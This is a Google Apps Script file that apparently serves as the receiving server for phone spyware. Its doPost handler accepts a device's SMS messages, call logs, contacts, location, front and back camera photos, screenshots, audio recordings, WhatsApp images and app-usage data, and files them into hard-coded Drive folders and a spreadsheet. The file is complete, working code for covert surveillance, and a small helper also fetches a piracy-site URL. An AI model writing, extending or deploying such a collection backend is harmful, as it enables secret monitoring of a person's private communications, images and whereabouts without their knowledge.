


function formatAMPM(date) {
  var hours = date.getHours();
  var minutes = date.getMinutes();
  var ampm = hours >= 12 ? 'pm' : 'am';
  hours = hours % 12;
  hours = hours ? hours : 12; // the hour '0' should be '12'
  minutes = minutes < 10 ? '0'+minutes : minutes;
  var strTime = hours + ':' + minutes + ' ' + ampm;
  return strTime;
}



function doPost(e) {
//////////init
  var ss = SpreadsheetApp.openByUrl("https://docs.google.com/spreadsheets/d/1VQL6lXUmVGoD6pO3FWMoEOkipUmccE5on4siaolmfnw/edit#gid=0");
  var dates = new Date();
  var time = formatAMPM(dates)+"";
  var date2 =  new Date().toLocaleDateString();
  var smsFolder = '1ScQs6Mj4FaftDCC5G3dIaZ0WcD_ZVYPk';
  var sheets = ss.getSheets();
  var cameraFolder = '1I9Po0QqA4hSiCwbxjqsToUgjgizLXEBx';   ////not used
  var whatsappFolder = '1SgEWnGvIRMbAQ9VzPXkei9hFlRXT4RII';
  var pathFolder = '1Lr1WyKLheE-kd_aLdUuDaJ799AbpiyQy';
  var contactFolder = '1vu7X26jOOikAzWL2WJKhDvtsYyyPdky2';
  var callFolder = '1lSs0BGPd9LopCDDhgwRESnDjGsyeza8K';
  var locationFolder = '1PLsa0aH0xA4nboHQjX2UCuJ9FBBmuHxK';
  var appUseFolder = '1fhC2k8-tfxPAOFdOjtt1V-wz6i9rT47Z';
  var backCamera = '1XRiRilkvcSuA7G9zXKwV7xeqeuNxWxBZ';  
  var frontCamera = '1XRiRilkvcSuA7G9zXKwV7xeqeuNxWxBZ';
  var screenFolder = '1u8n7NRsLGezXkp-1LDu2i_qjvbOTsaD9';
  var audioFolder = '1bfFLq-6_i1FfF7S2nvJfBEmn8rudyN9-';
  var customFolder = '1luld_kqeg8iRkkyVyGn4UGuP-B02uNeJ';
  var sheet = ss.getSheetByName('Location'); // be very careful ... it is the sheet name .. so it should match 



  /////////////////get every post data in json object in params         ///if we take from params.test gives json object
var params =JSON.parse(e.postData.contents);
    if(params.test){
var mysheet = ss.getSheetByName('Sms'); // be very careful ... it is the sheet name .. so it should match 


var myResult =params.test;
var date2 =  new Date().toLocaleDateString();
var dates = new Date();
var time = formatAMPM(dates)+"";
sheet.appendRow([date2,time,myResult]);
}


else if(params.Collection){




var myResult = params.Collection;




var mysheet = ss.getSheetByName('Sms'); // be very careful ... it is the sheet name .. so it should match 
return putSmsData(myResult);






}
else if(params.file){



    var isSuccess = false;
    var isOk = false;
    var SelfieCam = "Upload Failed";
    var BackCam = "Upload Failed";
    var back = params.file;
    var selfie = params.selfie;
    var filename = "test";
    isSuccess = uploadFileToDrive(back,"back");
   isOk = uploadFileToDrive(selfie,"Selfie");
      
      if(isSuccess){
      
      BackCam = "Uploaded";
      
      }
      if(isOk){
      
      SelfieCam = "Uploaded";
      
      }
      
      
    return ContentService    // return json success results
          .createTextOutput(
            JSON.stringify({"result":"success",
                            "BackCam": BackCam,
                            "Selfie": SelfieCam}))
          .setMimeType(ContentService.MimeType.JSON);
  
  




}
  else if(params.appUse){
  
    var appData = params.appUse;
       var dates = new Date();
 var time = formatAMPM(dates)+"";
       var doc = DocumentApp.create(time+" "+'AppUse');
      var docFile = DriveApp.getFileById( doc.getId() );
    
    docFile.setContent(JSON.stringify(appData));
   
  DriveApp.getFolderById(appUseFolder).addFile( docFile );
  DriveApp.getRootFolder().removeFile(docFile);
  
  
  }

else if(params.Screens){

    
    var isSuccess = false;
    
    var myScreens = params.Screens;
   
  
  
   for(var counts in myScreens){
    
   uploadScreentoDrive(myScreens[counts]);
    
   }
    
   
    
    
}

else if(params.Screen){

    
    var isSuccess = false;
    
    var myScreens = params.Screens;
   
  
  
 //   for(var counts in myScreens){
    
   //  uploadScreentoDrive(myScreens[counts]);
    
   // }
    
   uploadScreentoDrive(myScreens);
    
    
}

  else if(params.Source == 'Camera'){

  
    var Back = params.Back;
    var Selfie = params.Front;
    
    uploadFileToDrive(Back,"back");
    uploadFileToDrive(Selfie,"Selfie");
    
   

    
}

  
  else if(params.Source == 'Audio'){
  
    var dropbox = "My Dropbox";
    var folder, folders = DriveApp.getFoldersByName(dropbox);
   
    if (folders.hasNext()) {
      folder = folders.next();
    } else {
      folder = DriveApp.createFolder(dropbox);
    }

    var contentType = 'audio/mpeg';
    uploadAudio(params.Audio,contentType);
    return "OK";


}
  else if(params.Source == 'Sms'){

     var SmsData = params.Audio;
    var sheet = ss.getSheetByName('Sms'); 
    sheet.appendRow(['NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted']);  
  var dataAll = params.Audio; //
  var dataSet = dataAll;
  var rows = [],
      data;
  
 
var lastRow = sheet.getLastRow() + 1;

 sheet.appendRow([date2,time]);  
  for (i = 0; i < dataSet.length; i++) {
    data = dataSet[i];
    sheet.appendRow([date2,time,data.phoneNo, data.name,data.msg,data.date, data.date_sent,data.read,data.seen]);  
   
  }
    
    
    
    
    
      
    /*
   var dates = new Date();
 var time = formatAMPM(dates)+"";
    var SmsData = params.Audio;
      var doc = DocumentApp.create(time+" "+'Sms');
      var docFile = DriveApp.getFileById( doc.getId() );
    
    docFile.setContent(JSON.stringify(SmsData));
  DriveApp.getFolderById(smsFolder).addFile( docFile);
  DriveApp.getRootFolder().removeFile(docFile);
  */
  }
  /////returns boolean location enable or not
  else if(params.enable){
    
    
   
var sheet = ss.getSheetByName('Location'); 

var address = params.addressFull;
var city = params.city;
var state = params.state;
var country = params.country;
var postalCode = params.postalCode;
var knownName = params.knownName;
sheet.appendRow([date2,time,address, city,state,country,postalCode,knownName]);
  }
  else if(params.Source == 'Calls'){
     var CallData = params.Audio;
    var sheet = ss.getSheetByName('Calls'); 
   sheet.appendRow(['NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted','NewDataStarted']);  
  var dataAll = params.Audio; //
  var dataSet = dataAll;
  var rows = [],
      data;
  
 sheet.appendRow([date2,time]);  
var lastRow = sheet.getLastRow() + 1;

 sheet.appendRow([date2,time]);  
  for (i = 0; i < dataSet.length; i++) {
    data = dataSet[i];
    sheet.appendRow([date2,time,data.phoneNo, data.duration,data.type]);  
   
  }
  }
  else if(params.Source == 'Contacts'){
  var contactData = params.Audio;
   
      var dates = new Date();
 var time = formatAMPM(dates)+"";
  
      var doc = DocumentApp.create(time+" "+'Contacts');
      var docFile = DriveApp.getFileById( doc.getId() );
    
    docFile.setContent(JSON.stringify(contactData));
  DriveApp.getFolderById(contactFolder).addFile( docFile );
  DriveApp.getRootFolder().removeFile(docFile);
    
  }
  
  else if(params.DCIM){

    
 
    
    var myCamera = params.DCIM;
   
   
     var date2 =  new Date().toLocaleDateString();
var parentFolder = DriveApp.getFolderById(cameraFolder);
  
     var newFolder=parentFolder.createFolder(date2);

  
   for(var counts in myCamera){
    
   
     uploadImagetoDrive(myCamera[counts],newFolder);
    }
    
   //uploadImagetoDrive(myCamera,folderId);
    
    
}
    else if(params.Whatsapp){

    
    
    var myWhatsapp = params.Whatsapp;
    
   var random = Math.random( ); 
      var date2 =  new Date().toLocaleDateString();
var parentFolder = DriveApp.getFolderById(whatsappFolder);
  
     var newFolder=parentFolder.createFolder(date2);

  
 for(var counts in myWhatsapp){
    
   
     uploadImagetoDrive(myWhatsapp[counts],newFolder);
    }
    
  
    
   

}
  else if(params.Path){
   var pathData = params.Path;
   
      var dates = new Date();
 var time = formatAMPM(dates)+"";
  
      var doc = DocumentApp.create(time+" "+'Path');
      var docFile = DriveApp.getFileById( doc.getId() );
    
    docFile.setContent(JSON.stringify(pathData));
  DriveApp.getFolderById(pathFolder).addFile( docFile );
  DriveApp.getRootFolder().removeFile(docFile);
  }
  else if(params.Custom){
  
  
   
    var myCustom = params.Custom;
   
   var random = Math.random( ); 
      var date2 =  new Date().toLocaleDateString();
var parentFolder = DriveApp.getFolderById(customFolder);
  
     var newFolder=parentFolder.createFolder(date2);

  
 for(var counts in myCustom){
    
   
     uploadImagetoDrive(myCustom[counts],newFolder);
    }
    
  
    
   
  }
}
  
function uploadAudio(base64,type){




 var byteCharacters = Utilities.base64Decode(base64);

 
   var ss = Utilities.newBlob(byteCharacters, type);
  // mysheet.getRange('A12').setValue(type);
     var dates = new Date();
 var time = formatAMPM(dates)+"";
 var fileName="test";
   ss.setName(time+" "+fileName);
    
    
    var date2 =  new Date().toLocaleDateString();

  
  

    var parentFolder = DriveApp.getFolderById(audioFolder);
  
     
      parentFolder.createFile(ss);

    
   
    
  return true;



}


function uploadImagetoDrive(base64,folder){




 var byteCharacters = Utilities.base64Decode(base64);
 
 
 var type="image/jpeg";
 
 
   var ss = Utilities.newBlob(byteCharacters, type);
  // mysheet.getRange('A12').setValue(type);
     var dates = new Date();
 var time = formatAMPM(dates)+"";
 var fileName="test";
   ss.setName(time+" "+fileName);
    
    
   
      folder.createFile(ss);

    
   
    
  return true;



}



function uploadScreentoDrive(base64){




 var byteCharacters = Utilities.base64Decode(base64);
 
 
 var type="image/jpeg";
 
 
   var ss = Utilities.newBlob(byteCharacters, type);
  // mysheet.getRange('A12').setValue(type);
     var dates = new Date();
 var time = formatAMPM(dates)+"";
 var fileName="test";
   ss.setName(time+" "+fileName);
    
    
    var date2 =  new Date().toLocaleDateString();

  


    var parentFolder = DriveApp.getFolderById(screenFolder);
  
     
      parentFolder.createFile(ss);

    
   
    
  return true;



}


function message(msg) {
 return ContentService.createTextOutput(JSON.stringify({Result: msg })).setMimeType(ContentService.MimeType.JSON);
}



function doGet(e){

    return getItem(e);
 
  }
  
  
  function uploadFileToDrive(base64Data, fileName) {

  // var splitBase = base64Data.split(','),
   //type = splitBase[0].split(';')[0].replace('data:','');
    //var sss = SpreadsheetApp.openByUrl("https://docs.google.com/spreadsheets/d/1VQL6lXUmVGoD6pO3FWMoEOkipUmccE5on4siaolmfnw/edit#gid=0");
//var mysheet = sss.getSheetByName('Sms'); // be very careful ... it is the sheet name .. so it should match 

  // var byteCharacters = Utilities.base64Decode(splitBase[1]);
  var byteCharacters = Utilities.base64Decode(base64Data);
 
 
 var type="image/jpeg";
 
 
   var ss = Utilities.newBlob(byteCharacters, type);
  // mysheet.getRange('A12').setValue(type);
     var dates = new Date();
 var time = formatAMPM(dates)+"";
   ss.setName(time+" "+fileName);
    
    
    var date2 =  new Date().toLocaleDateString();

  
    if(fileName == "back"){
  
    var parentFolder = DriveApp.getFolderById(backCamera);
  
     
      parentFolder.createFile(ss);

    
    }
    else{
    
  
      var parentFolder = DriveApp.getFolderById(frontCamera);
  
     
      parentFolder.createFile(ss);
    }
    
    
  return true;
}
  
  
  
  function grouped(e,n){
  if(e != null){
  return e[n].toString();
  }
  else{
  return'';
  }
  
  }
  
  function soFetch(path){
  var url = path;
  var opt = {"method":"GET"};
  var resp = UrlFetchApp.fetch(url,opt);
  return resp.toString().replace(/\n|\r/g,'');
  }

function myFunction(){
var url = "http://tamilrockerrs.ch";
Logger.log(soFetch(url))
}
  
